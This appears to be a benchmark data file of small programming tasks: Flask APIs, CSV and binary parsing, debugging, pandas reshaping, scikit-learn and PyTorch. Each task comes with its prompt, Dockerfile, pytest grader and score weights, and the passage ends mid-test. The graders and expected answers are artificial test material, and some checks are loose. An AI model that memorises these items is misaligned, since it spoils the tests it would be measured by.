api-key-value-store-flask,medium,In-Memory Key-Value Store API,API/Web Service Implementation,"I need you to create a simple key-value store API using Flask. Can you put this in a file called `/app/kv_store.py`? I want two endpoints - first, a `POST /set` endpoint that takes a JSON body with the format `{""key"": ""some_key"", ""value"": ""some_value""}` to store data, and second, a `GET /get/<key>` endpoint that retrieves the value for a given key. For storage, just use a simple Python dictionary in memory - nothing fancy needed.",software-engineering,api|web|web-server|python|software-engineering,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN pip install flask

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess
import urllib.request
import json

def test_file_exists():
    """"""File `/app/kv_store.py` exists.""""""
    assert os.path.exists(""/app/kv_store.py"")

def test_server_running():
    """"""The Flask server is running.""""""
    result = subprocess.run(['pgrep', '-f', 'kv_store.py'], capture_output=True, text=True)
    assert result.returncode == 0

def test_post_set_succeeds():
    """"""A `POST` request to `/set` with a key-value pair returns a success status.""""""
    data = json.dumps({""key"": ""test_key"", ""value"": ""test_value""}).encode('utf-8')
    req = urllib.request.Request('http://localhost:5000/set', data=data, headers={'Content-Type': 'application/json'})
    
    response = urllib.request.urlopen(req)
    assert 200 <= response.getcode() < 300

def test_get_retrieves_value():
    """"""A subsequent `GET` request to `/get/<key>` returns the correct value.""""""
    # First set a value
    data = json.dumps({""key"": ""retrieve_test_key"", ""value"": ""retrieve_test_value""}).encode('utf-8')
    req = urllib.request.Request('http://localhost:5000/set', data=data, headers={'Content-Type': 'application/json'})
    urllib.request.urlopen(req)
    
    # Then get the value
    response = urllib.request.urlopen('http://localhost:5000/get/retrieve_test_key')
    content = response.read().decode('utf-8')
    response_data = json.loads(content)
    
    # The response should contain the correct value in JSON format
    assert response_data.get(""value"") == ""retrieve_test_value""","{""test_file_exists"": 0.10, ""test_server_running"": 0.20, ""test_post_set_succeeds"": 0.35, ""test_get_retrieves_value"": 0.35}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
api-file-based-persistence,hard,API with File-Based Persistence,API/Web Service Implementation,"I need you to create a persistent key-value store API using Flask in a file called `app.py`. The API should have two endpoints:

1. `POST /set` - Takes form data with 'key' and 'value' parameters to store a key-value pair
2. `GET /get?key=<key>` - Returns the value for the given key, or a 404 error if the key doesn't exist

When the server starts up, it should automatically load any existing data from `/app/data/kv_data.json`. Every time someone sets a value using `POST /set`, the entire data store should be saved back to that same JSON file. Please handle the case where the file doesn't exist when the server runs for the first time. After creating the app, start the Flask server on port 5000.",software-engineering,api|web|file-operations|python|web-server,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install flask

RUN mkdir -p /app/data/

CMD [""/bin/bash""]","import os
import subprocess
import json
import urllib.request
import urllib.parse
import urllib.error
import time
import signal

def test_server_running():
    """"""The Flask server is running.""""""
    # Check if a process is listening on port 5000 (default Flask port)
    result = subprocess.run(['netstat', '-ln'], capture_output=True, text=True)
    assert ':5000' in result.stdout

def test_file_updated_on_set():
    """"""After a `POST` to `/set`, the file `/app/data/kv_data.json` is created/updated with the correct data.""""""
    # Make a POST request to /set with test data
    data = urllib.parse.urlencode({'key': 'test_key', 'value': 'test_value'}).encode()
    req = urllib.request.Request('http://localhost:5000/set', data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    
    try:
        with urllib.request.urlopen(req):
            pass
    except urllib.error.HTTPError:
        pass  # Don't fail on HTTP errors, just ensure the request was made
    
    # Check if the file exists and contains the correct data
    assert os.path.exists('/app/data/kv_data.json')
    
    with open('/app/data/kv_data.json', 'r') as f:
        data = json.load(f)
    assert 'test_key' in data
    assert data['test_key'] == 'test_value'

def test_data_persists_after_restart():
    """"""If the server is stopped and restarted, a `GET` request for a previously set key returns the correct value, proving it loaded from the file.""""""
    # First set a key-value pair
    data = urllib.parse.urlencode({'key': 'persist_key', 'value': 'persist_value'}).encode()
    req = urllib.request.Request('http://localhost:5000/set', data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    
    try:
        with urllib.request.urlopen(req):
            pass
    except urllib.error.HTTPError:
        pass
    
    # Kill the Flask server process
    result = subprocess.run(['pgrep', '-f', 'flask'], capture_output=True, text=True)
    if result.stdout.strip():
        pid = int(result.stdout.strip().split('\n')[0])
        os.kill(pid, signal.SIGTERM)
        time.sleep(2)
    
    # Check that the port is free before restarting
    while True:
        result = subprocess.run(['netstat', '-ln'], capture_output=True, text=True)
        if ':5000' not in result.stdout:
            break
        time.sleep(0.5)
    
    # Start the server again using app.py
    subprocess.Popen(['python3', '/app/app.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)  # Give server time to start
    
    # Make a GET request for the previously set key
    try:
        with urllib.request.urlopen('http://localhost:5000/get?key=persist_key') as response:
            content = response.read().decode()
            assert 'persist_value' in content
    except urllib.error.HTTPError:
        assert False, ""Failed to retrieve previously set key after restart""

def test_handles_missing_keys():
    """"""The API handles GET requests for non-existent keys gracefully (e.g., returns a 404 error).""""""
    try:
        with urllib.request.urlopen('http://localhost:5000/get?key=nonexistent_key'):
            assert False, ""Expected 404 error for non-existent key""
    except urllib.error.HTTPError as e:
        assert e.code == 404","{""test_server_running"": 0.20, ""test_file_updated_on_set"": 0.30, ""test_data_persists_after_restart"": 0.35, ""test_handles_missing_keys"": 0.15}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
csv-file-parsing-amount-sum,easy,Parse a CSV File,File Parsing & Generation,"I have a CSV file located at `/app/data.csv` and I need you to write a Python script called `parser.py` that can read this file, calculate the sum of all the values in the ""Amount"" column, and then print out the total. Can you help me create this script?",file-operations,python|data-processing|file-operations,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo ""ID,Name,Amount"" > data.csv && \
    echo ""1,John,100"" >> data.csv && \
    echo ""2,Jane,250"" >> data.csv && \
    echo ""3,Bob,75"" >> data.csv

CMD [""/bin/bash""]","import os
import subprocess

def test_script_exists():
    """"""Script `parser.py` exists.""""""
    assert os.path.exists(""parser.py"")

def test_sum_calculation_correct():
    """"""Running `python3 parser.py` prints the correct sum of the ""Amount"" column.""""""
    result = subprocess.run([""python3"", ""parser.py""], capture_output=True, text=True)
    # Since the CSV has data rows with amounts 100, 250, 75, the sum should be 425
    assert ""425"" in result.stdout","{""test_script_exists"": 0.20, ""test_sum_calculation_correct"": 0.80}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
json-to-markdown-report-generator,medium,Generate a Markdown Report from JSON Data,File Parsing & Generation,"I have structured data stored in a JSON file at `/app/data.json` and I need you to write a Python script called `report_generator.py` that can read this JSON data and convert it into a human-readable Markdown file. The output file should be saved as `/app/report.md`. For the formatting, I'd like the report to include a main title at the top, then create a separate section for each top-level key found in the JSON data, with all the key-value pairs displayed as bullet points under their respective sections.",file-operations,python|file-operations|data-processing|text-processing,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo '{""user"": {""name"": ""John"", ""id"": 123}, ""system"": {""status"": ""ok""}}' > data.json

CMD [""/bin/bash""]","import os
import json

def test_script_exists():
    """"""Script `report_generator.py` exists.""""""
    assert os.path.exists(""report_generator.py"")

def test_report_file_created():
    """"""File `/app/report.md` is created.""""""
    assert os.path.exists(""/app/report.md"")

def test_markdown_content_valid():
    """"""The content of `report.md` is valid Markdown and accurately reflects the structure and data of `data.json`.""""""
    # Read the JSON data
    with open(""/app/data.json"", ""r"") as f:
        json_data = json.load(f)
    
    # Read the markdown report
    with open(""/app/report.md"", ""r"") as f:
        markdown_content = f.read()
    
    # Basic Markdown validity checks
    assert len(markdown_content.strip()) > 0
    
    # Check for main title (should start with # )
    lines = markdown_content.split('\n')
    assert any(line.startswith('# ') for line in lines)
    
    # Check that each top-level key from JSON appears as a section header
    for key in json_data.keys():
        assert f""## {key}"" in markdown_content or f""# {key}"" in markdown_content
    
    # Check that the nested data is represented
    # For the user section, should contain name and id
    assert ""John"" in markdown_content
    assert ""123"" in markdown_content
    
    # For the system section, should contain status and ok  
    assert ""status"" in markdown_content
    assert ""ok"" in markdown_content
    
    # Check for bullet point formatting (- or *)
    assert any(line.strip().startswith('-') or line.strip().startswith('*') for line in lines)","{""test_script_exists"": 0.15, ""test_report_file_created"": 0.25, ""test_markdown_content_valid"": 0.60}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
binary-log-format-parser,hard,Parse a Custom Binary Log Format,File Parsing & Generation,"I have a custom binary log file at `/app/events.log` from a legacy system that I need to parse. The format consists of a sequence of records where each record is exactly 12 bytes - it starts with a 4-byte Unix timestamp as a little-endian integer, followed by a 4-byte event ID also as a little-endian integer, and ends with a 4-byte value stored as a little-endian float. Could you write a Python script called `binary_parser.py` that reads this file, parses all the records, and prints them to the console in a human-readable format like `Timestamp: [ts], EventID: [id], Value: [val]`?",file-operations,python|file-operations|data-processing|data-extraction,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y python3

WORKDIR /app

RUN python3 -c ""import struct; data = struct.pack('<IIf', 1234567890, 1, 3.14) + struct.pack('<IIf', 1234567900, 2, 2.71) + struct.pack('<IIf', 1234567910, 3, 1.41); open('events.log', 'wb').write(data)""

CMD [""/bin/bash""]","import os
import subprocess

def test_script_exists():
    """"""Script `binary_parser.py` exists.""""""
    assert os.path.exists(""/app/binary_parser.py"")

def test_binary_parsing_correct():
    """"""The script's output correctly decodes and displays all records from the binary file, demonstrating correct use of byte-level parsing (e.g., with Python's `struct` module).Total: 1.0""""""
    # Run the script and capture output
    result = subprocess.run(['python3', '/app/binary_parser.py'], capture_output=True, text=True, cwd='/app')
    
    # Check that the script ran successfully
    assert result.returncode == 0
    
    # Check that output contains expected format elements
    output = result.stdout
    assert ""Timestamp:"" in output
    assert ""EventID:"" in output  
    assert ""Value:"" in output
    
    # Check that multiple records are displayed (since file contains several records)
    lines = output.strip().split('\n')
    record_lines = [line for line in lines if ""Timestamp:"" in line and ""EventID:"" in line and ""Value:"" in line]
    assert len(record_lines) >= 1  # Should have at least one properly formatted record","{""test_script_exists"": 0.2, ""test_binary_parsing_correct"": 0.8}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
debugging-off-by-one-loop-error,medium,Fix an Off-by-One Error,Debugging & Code Comprehension (Revised),I'm having trouble with my script at `/app/summarize.py` - it keeps missing the last item whenever it generates a summary. I think there might be a logic error somewhere in one of the loops. Could you take a look at it and fix the issue for me?,debugging,debugging|python|algorithms,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN echo 'def summarize_list(my_list):\n    total = 0\n    for i in range(len(my_list) - 1):\n        total += my_list[i]\n    return total' > /app/summarize.py

RUN echo 'from summarize import summarize_list\n\ndef test_summarize():\n    test_list = [1, 2, 3, 4, 5]\n    expected = 15\n    result = summarize_list(test_list)\n    assert result == expected, f""Expected {expected}, got {result}""\n\nif __name__ == ""__main__"":\n    test_summarize()\n    print(""All tests passed!"")' > /app/test_summary.py

CMD [""/bin/bash""]","import os
import subprocess

def test_loop_range_corrected():
    """"""The file `/app/summarize.py` is modified to correct the loop's range.""""""
    with open('/app/summarize.py', 'r') as f:
        content = f.read()
    
    # Check that the corrected range is present and the buggy range is not
    assert 'range(len(my_list))' in content
    assert 'range(len(my_list) - 1)' not in content

def test_test_script_passes():
    """"""The provided test script `/app/test_summary.py` now passes.""""""
    result = subprocess.run(['python', '/app/test_summary.py'], 
                          capture_output=True, text=True, cwd='/app')
    assert result.returncode == 0","{""test_loop_range_corrected"": 0.40, ""test_test_script_passes"": 0.60}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
debugging-thread-unsafe-counter-fix,hard,Fix a Thread-Unsafe Data Structure (Revised),Debugging & Code Comprehension (Revised),"I have a Python script at `/app/counter.py` that's giving me trouble. It uses multiple threads to increment a global counter, but the final count is inconsistent - sometimes it's correct, sometimes it's wrong. I think this is a race condition issue that's made non-deterministic by Python's GIL. Can you help me fix the script so that the final count is always correct?",debugging,debugging|python|multiprocessing|troubleshooting|coding,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN echo 'import threading' > /app/counter.py && \
    echo '' >> /app/counter.py && \
    echo 'counter = 0' >> /app/counter.py && \
    echo '' >> /app/counter.py && \
    echo 'def increment():' >> /app/counter.py && \
    echo '    global counter' >> /app/counter.py && \
    echo '    for _ in range(100000):' >> /app/counter.py && \
    echo '        counter += 1' >> /app/counter.py && \
    echo '' >> /app/counter.py && \
    echo 'if __name__ == ""__main__"":' >> /app/counter.py && \
    echo '    thread1 = threading.Thread(target=increment)' >> /app/counter.py && \
    echo '    thread2 = threading.Thread(target=increment)' >> /app/counter.py && \
    echo '    ' >> /app/counter.py && \
    echo '    thread1.start()' >> /app/counter.py && \
    echo '    thread2.start()' >> /app/counter.py && \
    echo '    ' >> /app/counter.py && \
    echo '    thread1.join()' >> /app/counter.py && \
    echo '    thread2.join()' >> /app/counter.py && \
    echo '    ' >> /app/counter.py && \
    echo '    print(f""Final counter value: {counter}"")' >> /app/counter.py

CMD [""/bin/bash""]","import os
import subprocess
import re

def test_synchronization_mechanism_added():
    """"""The script `/app/counter.py` is modified to include a synchronization mechanism (e.g., `threading.Lock`).""""""
    with open('/app/counter.py', 'r') as f:
        content = f.read()
    
    # Check for common threading synchronization mechanisms
    sync_mechanisms = [
        'threading.Lock',
        'Lock()',
        'threading.RLock', 
        'RLock()',
        'threading.Semaphore',
        'Semaphore(',
        'threading.Condition',
        'Condition(',
        'with lock:',
        'lock.acquire',
        'lock.release'
    ]
    
    assert any(mechanism in content for mechanism in sync_mechanisms)

def test_correct_final_count_achieved():
    """"""Running the script now produces the correct final count (200,000), which is guaranteed to fail without the lock under the test harness.""""""
    result = subprocess.run(['python', '/app/counter.py'], capture_output=True, text=True)
    assert result.returncode == 0
    
    # Extract the final counter value using regex
    match = re.search(r'Final counter value:\s*(\d+)', result.stdout)
    assert match is not None, ""Could not find final counter value in output""
    final_count = int(match.group(1))
    assert final_count == 200000","{""test_synchronization_mechanism_added"": 0.4, ""test_correct_final_count_achieved"": 0.6}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
csv-filter-by-value,easy,Filter a CSV by Value,Data Processing & Transformation,I have a CSV file with sales data located at `/app/sales.csv` and I need you to write a Python script called `filter_sales.py` that will help me extract the high-value transactions. The script should create a new file at `/app/high_value_sales.csv` that contains only the rows where the SaleAmount column has values greater than 1000. Can you help me with this?,file-operations,data-processing|file-operations|python|data,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo ""OrderID,Product,SaleAmount"" > /app/sales.csv && \
    echo ""1001,Laptop,1200.50"" >> /app/sales.csv && \
    echo ""1002,Mouse,25.99"" >> /app/sales.csv && \
    echo ""1003,Keyboard,75.00"" >> /app/sales.csv && \
    echo ""1004,Monitor,350.75"" >> /app/sales.csv && \
    echo ""1005,Headphones,89.99"" >> /app/sales.csv && \
    echo ""1006,Tablet,450.00"" >> /app/sales.csv && \
    echo ""1007,Phone,899.99"" >> /app/sales.csv && \
    echo ""1008,Charger,19.95"" >> /app/sales.csv

CMD [""/bin/bash""]","import os
import csv

def test_script_exists():
    """"""Script `filter_sales.py` exists.""""""
    assert os.path.exists(""filter_sales.py"")

def test_output_file_created():
    """"""File `/app/high_value_sales.csv` is created.""""""
    assert os.path.exists(""/app/high_value_sales.csv"")

def test_filtering_correct():
    """"""All rows in the output file have a ""SaleAmount"" greater than 1000, and no such rows from the input are missing.Total: 1.0""""""
    # Read input file to get all rows with SaleAmount > 1000
    input_high_value_rows = []
    with open(""/app/sales.csv"", ""r"") as f:
        reader = csv.DictReader(f)
        for row in reader:
            if float(row[""SaleAmount""]) > 1000:
                input_high_value_rows.append(row)
    
    # Read output file and verify all rows have SaleAmount > 1000
    output_rows = []
    with open(""/app/high_value_sales.csv"", ""r"") as f:
        reader = csv.DictReader(f)
        for row in reader:
            assert float(row[""SaleAmount""]) > 1000
            output_rows.append(row)
    
    # Verify no qualifying rows are missing (same count)
    assert len(output_rows) == len(input_high_value_rows)
    
    # Verify all high-value rows from input are present in output
    for input_row in input_high_value_rows:
        found = False
        for output_row in output_rows:
            if (input_row[""OrderID""] == output_row[""OrderID""] and 
                input_row[""Product""] == output_row[""Product""] and
                input_row[""SaleAmount""] == output_row[""SaleAmount""]):
                found = True
                break
        assert found","{""test_script_exists"": 0.1, ""test_output_file_created"": 0.2, ""test_filtering_correct"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
data-processing-csv-join-files,medium,Join Two CSV Files,Data Processing & Transformation,"I have two CSV files that I need to combine into a single report. The first file is `/app/users.csv` which contains `UserID` and `Name` columns, and the second is `/app/orders.csv` with `OrderID`, `UserID`, and `Product` columns. Could you write a Python script called `join_data.py` that will merge these files together? I want the output to be saved as `/app/report.csv` and it should include the user's `Name` alongside each order record.",data-science,data-processing|python|file-operations|data,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo ""UserID,Name"" > /app/users.csv && \
    echo ""1,Alice Johnson"" >> /app/users.csv && \
    echo ""2,Bob Smith"" >> /app/users.csv && \
    echo ""3,Carol Davis"" >> /app/users.csv

RUN echo ""OrderID,UserID,Product"" > /app/orders.csv && \
    echo ""101,1,Laptop"" >> /app/orders.csv && \
    echo ""102,2,Mouse"" >> /app/orders.csv && \
    echo ""103,1,Keyboard"" >> /app/orders.csv && \
    echo ""104,3,Monitor"" >> /app/orders.csv && \
    echo ""105,2,Headphones"" >> /app/orders.csv

CMD [""/bin/bash""]","import os
import csv

def test_script_exists():
    """"""Script `join_data.py` exists.""""""
    assert os.path.exists(""join_data.py"") or os.path.exists(""/app/join_data.py"")

def test_report_file_created():
    """"""File `/app/report.csv` is created.""""""
    assert os.path.exists(""/app/report.csv"")

def test_data_joined_correctly():
    """"""The `report.csv` file contains the correctly joined data, with columns like `OrderID,UserID,Product,Name`.Total: 1.0""""""
    assert os.path.exists(""/app/report.csv"")
    
    # Expected joined data
    expected_data = [
        {""OrderID"": ""101"", ""UserID"": ""1"", ""Product"": ""Laptop"", ""Name"": ""Alice Johnson""},
        {""OrderID"": ""102"", ""UserID"": ""2"", ""Product"": ""Mouse"", ""Name"": ""Bob Smith""},
        {""OrderID"": ""103"", ""UserID"": ""1"", ""Product"": ""Keyboard"", ""Name"": ""Alice Johnson""},
        {""OrderID"": ""104"", ""UserID"": ""3"", ""Product"": ""Monitor"", ""Name"": ""Carol Davis""},
        {""OrderID"": ""105"", ""UserID"": ""2"", ""Product"": ""Headphones"", ""Name"": ""Bob Smith""}
    ]
    
    with open(""/app/report.csv"", ""r"") as f:
        reader = csv.DictReader(f)
        rows = list(reader)
        
        # Check we have the right number of rows
        assert len(rows) == len(expected_data), f""Expected {len(expected_data)} rows, got {len(rows)}""
        
        # Check each row matches expected data
        for expected_row in expected_data:
            found = False
            for actual_row in rows:
                if (actual_row.get(""OrderID"") == expected_row[""OrderID""] and
                    actual_row.get(""UserID"") == expected_row[""UserID""] and
                    actual_row.get(""Product"") == expected_row[""Product""] and
                    actual_row.get(""Name"") == expected_row[""Name""]):
                    found = True
                    break
            assert found, f""Missing expected row: {expected_row}""","{""test_script_exists"": 0.15, ""test_report_file_created"": 0.15, ""test_data_joined_correctly"": 0.70}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
data-reshape-long-to-wide-format,hard,Reshape Data from Long to Wide Format,Data Processing & Transformation,"I have sensor data stored at `/app/sensor_data.csv` that's currently in a long format with columns for `timestamp`, `sensor_id`, `measurement_type`, and `value`. I need to reshape this data into a wide format for my analysis work. Could you write a Python script called `reshape.py` that will pivot this data and save it as `/app/wide_data.csv`? The output should have one row for each unique combination of `timestamp`, with separate columns for each unique combination of `sensor_id` and `measurement_type` containing the corresponding `value` readings.",data-science,data-processing|python|data|file-operations,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y python3 python3-pandas

WORKDIR /app

RUN echo 'timestamp,sensor_id,measurement_type,value' > sensor_data.csv && \
    echo '2024-01-01 00:00:00,sensor_001,temperature,23.5' >> sensor_data.csv && \
    echo '2024-01-01 00:00:00,sensor_001,humidity,45.2' >> sensor_data.csv && \
    echo '2024-01-01 00:00:00,sensor_002,temperature,24.1' >> sensor_data.csv && \
    echo '2024-01-01 00:00:00,sensor_002,humidity,43.8' >> sensor_data.csv && \
    echo '2024-01-01 01:00:00,sensor_001,temperature,23.8' >> sensor_data.csv && \
    echo '2024-01-01 01:00:00,sensor_001,humidity,46.1' >> sensor_data.csv && \
    echo '2024-01-01 01:00:00,sensor_002,temperature,24.3' >> sensor_data.csv && \
    echo '2024-01-01 01:00:00,sensor_002,humidity,44.2' >> sensor_data.csv

CMD [""/bin/bash""]","import os
import pandas as pd

def test_script_exists():
    """"""Script `reshape.py` exists.""""""
    assert os.path.exists(""/app/reshape.py"")

def test_output_file_created():
    """"""File `/app/wide_data.csv` is created.""""""
    assert os.path.exists(""/app/wide_data.csv"")

def test_data_correctly_pivoted():
    """"""The output CSV is correctly pivoted, with `Timestamp` as the index and sensor IDs as columns.Total: 1.0""""""
    # Read the output file
    df = pd.read_csv(""/app/wide_data.csv"")
    
    # Check that the first column is timestamp-related (either as index or first column)
    first_col = df.columns[0].lower()
    assert 'timestamp' in first_col or df.index.name and 'timestamp' in df.index.name.lower()
    
    # Check that there are columns for sensor data (should have sensor_001 and sensor_002 related columns)
    column_names = ' '.join(df.columns).lower()
    assert 'sensor_001' in column_names or 'sensor_002' in column_names
    
    # Verify the data is wider than the original (original has 4 columns, wide should have more)
    original_df = pd.read_csv(""/app/sensor_data.csv"")
    assert len(df.columns) >= len(original_df.columns)
    
    # Check that we have fewer rows than original (pivoting should reduce rows)
    assert len(df) < len(original_df)","{""test_script_exists"": 0.15, ""test_output_file_created"": 0.15, ""test_data_correctly_pivoted"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
svm-hyperparameter-tuning-randomized-search,hard,Hyperparameter Tuning with Randomized Search (Revised),Model Training & Evaluation (Revised),"I need help finding good hyperparameters for an SVM model using the data in `/app/data.csv`, but I don't want to test every possible combination since that would take forever. Could you write a script called `tune.py` that uses `RandomizedSearchCV` to search over a uniform distribution for the `C` parameter, maybe something like from 0.1 to 10, and also test different `kernel` options including 'linear' and 'rbf'? I want to keep this efficient, so please configure the search to perform exactly 5 iterations by setting `n_iter=5`. The script should print out the best combination of parameters it finds so I can see what works best for my data.",model-training,machine-learning|optimization|python|data-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install scikit-learn pandas

RUN echo ""feature1,feature2,feature3,feature4,feature5,target"" > /app/data.csv && \
    for i in $(seq 1 99); do \
        echo ""$((RANDOM % 100)),$((RANDOM % 100)),$((RANDOM % 100)),$((RANDOM % 100)),$((RANDOM % 100)),$((RANDOM % 2))"" >> /app/data.csv; \
    done

CMD [""/bin/bash""]","import os
import subprocess
import re

def test_script_setup_correct():
    """"""Script `tune.py` exists and correctly sets up `RandomizedSearchCV`.""""""
    script_path = ""/app/tune.py""
    
    # Check file exists
    assert os.path.exists(script_path)
    
    # Read the file and check for key components
    with open(script_path, ""r"") as f:
        content = f.read()
    
    # Check for RandomizedSearchCV import/usage
    assert ""RandomizedSearchCV"" in content
    
    # Check for n_iter=5 configuration
    assert ""n_iter=5"" in content or ""n_iter = 5"" in content
    
    # Check for C parameter with uniform distribution (0.1 to 10)
    # Should have uniform distribution setup
    assert (""uniform"" in content or ""scipy.stats.uniform"" in content), ""Should use uniform distribution for C parameter""
    
    # Check for kernel options
    assert ""'linear'"" in content or '""linear""' in content, ""Should include 'linear' kernel""
    assert ""'rbf'"" in content or '""rbf""' in content, ""Should include 'rbf' kernel""

def test_search_executes_correctly():
    """"""The script runs, performs exactly 5 iterations, and prints the best parameters found.""""""
    # Run the script from the app directory
    result = subprocess.run([""python"", ""/app/tune.py""], capture_output=True, text=True, cwd=""/app"")
    
    # Check it ran successfully
    assert result.returncode == 0, f""Script failed with: {result.stderr}""
    
    # Check that it prints best parameters (should contain ""best"" and some parameter info)
    output = result.stdout.lower()
    assert ""best"" in output, ""Should print best parameters""
    
    # Check for parameter mentions (C, kernel)
    assert ""c"" in output, ""Should print C parameter value""
    assert ""kernel"" in output, ""Should print kernel parameter value""","{""test_script_setup_correct"": 0.60, ""test_search_executes_correctly"": 0.40}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
model-inference-prediction-script,easy,Simple Model Inference Script,Model Implementation & Inference,"I have a pre-trained scikit-learn model that I've saved at `/app/model.pkl`, and I also have a new data point stored in a JSON file at `/app/new_data.json`. Could you help me write a script called `predict.py` that loads the model, reads the new data, and prints out what the model predicts for that data point? The script should print exactly '0' or '1' as the prediction result.",machine-learning,machine-learning|python|file-operations|data-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN pip install scikit-learn pandas

WORKDIR /app

RUN echo 'import pickle' > create_model.py && \
    echo 'from sklearn.linear_model import LogisticRegression' >> create_model.py && \
    echo 'import numpy as np' >> create_model.py && \
    echo 'model = LogisticRegression()' >> create_model.py && \
    echo 'X = np.array([[1, 2], [3, 4]])' >> create_model.py && \
    echo 'y = np.array([0, 1])' >> create_model.py && \
    echo 'model.fit(X, y)' >> create_model.py && \
    echo ""with open('model.pkl', 'wb') as f:"" >> create_model.py && \
    echo '    pickle.dump(model, f)' >> create_model.py && \
    python create_model.py

RUN echo '{""feature1"": 1.5, ""feature2"": 2.5}' > new_data.json

CMD [""/bin/bash""]","import os
import subprocess

def test_script_exists():
    """"""Script `predict.py` exists.""""""
    assert os.path.exists(""predict.py"")

def test_prediction_output_valid():
    """"""The script runs and prints a valid prediction (e.g., `0` or `1`).Total: 1.0""""""
    result = subprocess.run([""python"", ""predict.py""], capture_output=True, text=True)
    assert result.returncode == 0
    output = result.stdout.strip()
    assert output in [""0"", ""1""]","{""test_script_exists"": 0.20, ""test_prediction_output_valid"": 0.80}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
pytorch-custom-gated-layer-implementation,medium,Implement a Custom PyTorch Module,Model Implementation & Inference,"I need you to create a custom neural network layer in PyTorch for me. Could you implement a PyTorch nn.Module called SimpleGatedLayer in a file named custom_layer.py? The layer should take an input tensor x and compute the output as torch.sigmoid(gate) * x, where gate is a linear transformation of x. I'd like the __init__ method to initialize the linear layer for the gate (please store it as self.gate and include bias in the linear layer), and the forward method should implement this logic.",machine-learning,pytorch|machine-learning|model-training|algorithms,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN pip install torch

WORKDIR /app

RUN echo 'import torch' > /app/test_layer.py && \
    echo 'import torch.nn as nn' >> /app/test_layer.py && \
    echo 'from custom_layer import SimpleGatedLayer' >> /app/test_layer.py && \
    echo '' >> /app/test_layer.py && \
    echo 'def test_simple_gated_layer():' >> /app/test_layer.py && \
    echo '    # Test initialization' >> /app/test_layer.py && \
    echo '    input_size = 10' >> /app/test_layer.py && \
    echo '    layer = SimpleGatedLayer(input_size)' >> /app/test_layer.py && \
    echo '    ' >> /app/test_layer.py && \
    echo '    # Check if it\''s a nn.Module' >> /app/test_layer.py && \
    echo '    assert isinstance(layer, nn.Module), ""SimpleGatedLayer should inherit from nn.Module""' >> /app/test_layer.py && \
    echo '    ' >> /app/test_layer.py && \
    echo '    # Check if it has the required components' >> /app/test_layer.py && \
    echo '    assert hasattr(layer, \''gate\''), ""SimpleGatedLayer should have a \''gate\'' attribute""' >> /app/test_layer.py && \
    echo '    assert isinstance(layer.gate, nn.Linear), ""Gate should be a nn.Linear layer""' >> /app/test_layer.py && \
    echo '    ' >> /app/test_layer.py && \
    echo '    # Test forward pass' >> /app/test_layer.py && \
    echo '    batch_size = 5' >> /app/test_layer.py && \
    echo '    x = torch.randn(batch_size, input_size)' >> /app/test_layer.py && \
    echo '    output = layer(x)' >> /app/test_layer.py && \
    echo '    ' >> /app/test_layer.py && \
    echo '    # Check output shape' >> /app/test_layer.py && \
    echo '    assert output.shape == x.shape, f""Output shape {output.shape} should match input shape {x.shape}""' >> /app/test_layer.py && \
    echo '    ' >> /app/test_layer.py && \
    echo '    # Check forward pass logic manually' >> /app/test_layer.py && \
    echo '    gate_output = layer.gate(x)' >> /app/test_layer.py && \
    echo '    expected_output = torch.sigmoid(gate_output) * x' >> /app/test_layer.py && \
    echo '    assert torch.allclose(output, expected_output, atol=1e-6), ""Forward pass logic is incorrect""' >> /app/test_layer.py && \
    echo '    ' >> /app/test_layer.py && \
    echo '    # Test with different input sizes' >> /app/test_layer.py && \
    echo '    x2 = torch.randn(3, input_size)' >> /app/test_layer.py && \
    echo '    output2 = layer(x2)' >> /app/test_layer.py && \
    echo '    assert output2.shape == x2.shape, ""Should work with different batch sizes""' >> /app/test_layer.py && \
    echo '    ' >> /app/test_layer.py && \
    echo '    print(""All tests passed!"")' >> /app/test_layer.py && \
    echo '' >> /app/test_layer.py && \
    echo 'if __name__ == ""__main__"":' >> /app/test_layer.py && \
    echo '    test_simple_gated_layer()' >> /app/test_layer.py

CMD [""/bin/bash""]","import os
import subprocess

def test_file_exists():
    """"""File `/app/custom_layer.py` with the `SimpleGatedLayer` class exists.""""""
    # Check if file exists
    assert os.path.exists(""/app/custom_layer.py"")
    
    # Check if SimpleGatedLayer class exists in the file
